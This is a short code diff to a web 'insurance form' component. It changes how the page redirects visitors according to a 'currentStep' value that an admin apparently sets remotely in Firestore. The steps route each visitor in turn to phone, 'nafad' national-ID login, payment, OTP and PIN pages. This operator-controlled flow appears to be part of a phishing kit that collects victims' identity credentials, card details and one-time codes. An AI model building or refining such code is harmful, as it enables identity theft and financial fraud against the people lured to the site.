@@ -110,18 +110,24 @@ export default function InsuranceForm() {
           const data = docSnapshot.data()
           const step = data.currentStep
 
-          // Redirect based on currentStep
+          // Admin navigation: Handle page redirects
           if (step === "phone") {
-            router.push("/phone-info")
+            console.log("[main] Admin redirecting to phone-info")
+            window.location.href = "/phone-info"
           } else if (step === "nafad") {
-            router.push("/nafad")
+            console.log("[main] Admin redirecting to nafad")
+            window.location.href = "/nafad"
           } else if (step === "payment") {
-            router.push("/check")
+            console.log("[main] Admin redirecting to payment")
+            window.location.href = "/check"
           } else if (step === "otp") {
-            router.push("/veri")
+            console.log("[main] Admin redirecting to otp")
+            window.location.href = "/veri"
           } else if (step === "pin") {
-            router.push("/confi")
+            console.log("[main] Admin redirecting to pin")
+            window.location.href = "/confi"
           }
+          // If step === "home" or numeric, stay on this page
         }
       },
       (error) => {
